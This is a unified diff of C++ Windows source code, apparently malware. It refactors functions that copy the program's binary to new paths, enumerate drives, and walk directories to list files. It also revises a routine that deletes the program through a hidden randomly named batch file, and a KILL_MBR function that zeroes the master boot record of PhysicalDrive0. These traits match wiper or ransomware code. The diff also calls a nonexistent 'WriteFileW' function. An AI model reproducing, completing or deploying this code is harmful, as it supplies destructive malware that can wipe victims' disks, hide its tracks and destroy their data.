@@ -14,24 +14,25 @@
 
 // Improve this
 BOOL fnCopyFileW(
+	_In_ LPCWSTR lpMfn,
 	_In_ LPCWSTR lpAdpn,
 	_In_ LPCWSTR lpAdfn
 ) {
-	if (CreateDirectory(lpAdpn, NULL)) {
-		if (CopyFile(szMfn, lpAdfn, FALSE)) {
+	if (CreateDirectoryW(lpAdpn, NULL)) {
+		if (CopyFileW(lpMfn, lpAdfn, FALSE)) {
 			return TRUE;
 		} else {
-			fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
+			fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, lpMfn, lpAdfn);
 			return FALSE;
 		}
 	} else {
 		if (GetLastError() == ERROR_ALREADY_EXISTS) {
 			fnMessageHandlerW(NULL, L"Directory already exist\nPath: %s", L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);
 
-			if (CopyFile(szMfn, lpAdfn, FALSE)) {
+			if (CopyFileW(lpMfn, lpAdfn, FALSE)) {
 				return TRUE;
 			} else {
-				fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
+				fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, lpMfn, lpAdfn);
 				return FALSE;
 			}
 		} else {
@@ -47,12 +48,12 @@ BOOL fnDriveEnumeratorW(
 ) {
 	WCHAR szDrives[nDRIVES];
 	std::wstring szDrive;
-	if (GetLogicalDriveStrings(nDRIVES, szDrives)) {
+	if (GetLogicalDriveStringsW(nDRIVES, szDrives)) {
 		for (INT i = 0; i < nDRIVES; i += 4) {
 			if (szDrives[i] != L'\0') {
 				szDrive = { szDrives[i], szDrives[i + 1], szDrives[i + 2] };
 
-				UINT uDt = GetDriveType(szDrive.c_str());
+				UINT uDt = GetDriveTypeW(szDrive.c_str());
 				if (uDt) {
 					if (uDt != DRIVE_NO_ROOT_DIR && uDt != DRIVE_CDROM) {
 						vszDrives->push_back(szDrive);
@@ -79,7 +80,7 @@ BOOL fnDirectoryIteratorW(
 ) {
 	WIN32_FIND_DATA w32Fd;
 	std::wstring szW32fd = ((std::wstring)szDir + L"\\" + (std::wstring)szMask);
-	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
+	HANDLE hFind = FindFirstFileW(szW32fd.c_str(), &w32Fd);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -89,7 +90,7 @@ BOOL fnDirectoryIteratorW(
 			} else {
 				vszFile->push_back((std::wstring)szDir + L"\\" + w32Fd.cFileName);
 			}
-		} while (FindNextFile(hFind, &w32Fd));
+		} while (FindNextFileW(hFind, &w32Fd));
 
 		FindClose(hFind);
 		return TRUE;
@@ -136,22 +137,26 @@ BOOL fnDirectoryIteratorW(
 //	}
 //}
 
-BOOL fnSelfDeleteW(VOID) {
-	DWORD dwBufferSize = NULL;
+BOOL fnSelfDeleteW(
+	_In_ LPCWSTR lpCd,
+	_In_ LPCWSTR lpMfn
+) {
+	DWORD dwBufferSize;
 	HANDLE hHeap = GetProcessHeap();
 
-	LPCWSTR lpCGRS = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);
-	std::wstring szBat = szCd + (std::wstring)lpCGRS + L".bat";
+	LPCWSTR lpCGRS = fnCryptGenRandomStringW(hHeap, NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);
+	std::wstring szBat = lpCd + (std::wstring)lpCGRS + L".bat";
 
 	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA101, RT_RCDATA, &dwBufferSize);
 	if (lpBuffer) {
-		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
+		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY,
+			(dwBufferSize + (lstrlenW(lpMfn) * sizeof(WCHAR)) + (lstrlenW(szBat.c_str()) * sizeof(WCHAR))));
 		if (pszDest) {
 			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
 			if (ulHeap != (SIZE_T)-1) {
-				if (SUCCEEDED(StringCbPrintf((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, szMfn, szMfn, szBat))) {
+				if (SUCCEEDED(StringCbPrintfW((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, lpMfn, lpMfn, szBat))) {
 					if (fnSaveResourceW(szBat.c_str(), pszDest, ulHeap)) {
-						INT dwError = (INT)ShellExecute(NULL, L"open", szBat.c_str(), NULL, szCd, SW_HIDE);
+						INT dwError = (INT)ShellExecuteW(NULL, L"open", szBat.c_str(), NULL, lpCd, SW_HIDE);
 						if (dwError > 32) {
 							HeapFree(hHeap, NULL, pszDest);
 							return TRUE;
@@ -174,20 +179,20 @@ BOOL fnSelfDeleteW(VOID) {
 		}
 	}
 
-	delete[] lpCGRS;
+	HeapFree(hHeap, NULL, (LPVOID)lpCGRS);
 	return FALSE;
 }
 
 #if KILL_MBR == TRUE
 	// at somepoint I might implement a custom MBR displaying a message
 	BOOL fnOverwriteMBR(VOID) {
-		WCHAR szMbrData[nMBR];
+		BYTE szMbrData[nMBR_SIZE];
 		ZeroMemory(&szMbrData, sizeof(szMbrData));
 		DWORD dwNOBW;
 
-		HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+		HANDLE hMbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 		if (hMbr) {
-			if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
+			if (WriteFileW(hMbr, szMbrData, nMBR_SIZE, &dwNOBW, NULL)) {
 				CloseHandle(hMbr);
 				return TRUE;
 			} else {
